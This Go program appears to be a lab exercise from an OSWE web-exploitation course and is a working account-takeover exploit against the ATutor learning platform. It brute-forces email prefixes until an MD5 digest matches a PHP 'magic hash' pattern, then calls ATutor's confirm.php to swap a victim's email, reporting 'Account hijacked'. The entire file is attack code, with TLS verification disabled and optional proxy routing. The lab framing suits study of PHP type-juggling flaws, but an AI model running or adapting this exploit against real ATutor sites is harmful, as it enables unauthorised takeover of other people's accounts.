package main

import (
	"crypto/md5"
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"

	"github.com/iPhantasmic/OSWE/scripts/utils"
	"github.com/mowshon/iterium"
)

// Ex 4.5.2.2 - Part 2: Send update email

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func updateEmail(debug bool, ip, domain, id string, prefixLength int) {
	product := iterium.Product(iterium.AsciiLowercase, prefixLength)

	// merge a slice into a string
	// []string{"a", "b", "c"} => "abc"
	join := func(product []string) string {
		return strings.Join(product, "")
	}

	prefixes := iterium.Map(product, join)

	count := 0
	for prefix := range prefixes.Chan() {
		email := fmt.Sprintf("%s@%s", prefix, domain)
		// we will cheat because the requests take too long
		payload := fmt.Sprintf("%s@%s"+"2016-03-10 16:00:00"+id, prefix, domain)

		hasher := md5.New()
		hasher.Write([]byte(payload))

		substring := hex.EncodeToString(hasher.Sum(nil))[:10]

		// https://stackoverflow.com/questions/33780595/whats-wrong-with-the-golang-regexp-matchstring
		re := regexp.MustCompile(`^0+[eE]\d+$`)
		match := re.MatchString(substring)

		if match {
			// URL manipulation
			requestURL := fmt.Sprintf("http://%s/ATutor/confirm.php?e=%s&m=0&id=%s", ip, email, id)
			utils.PrintInfo("Sending update email HTTP request to: " + requestURL)

			// send the request
			response := utils.SendGetRequest(client, debug, requestURL)
			count++
			if response.StatusCode == 302 {
				utils.PrintSuccess(fmt.Sprintf("Account hijacked with email %s using %d requests!", email, count))
				return
			}
		}
	}

	utils.PrintFailure("Account hijacking failed!")
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()

	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 5 {
		utils.PrintFailure(fmt.Sprintf("usage: %s <domain name> <id> <prefix length> <ip>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s offsec.local 1 3 192.168.234.103", os.Args[0]))
		os.Exit(1)
	}

	domain := flag.Arg(0)
	id := flag.Arg(1)
	prefixLength, err := strconv.Atoi(flag.Arg(2))
	if err != nil {
		log.Fatalln("Invalid prefix length!")
	}
	ip := flag.Arg(3)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// create our HTTP client using the above transport and set the global variable
	client = &http.Client{
		Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	updateEmail(*debug, ip, domain, id, prefixLength)
}
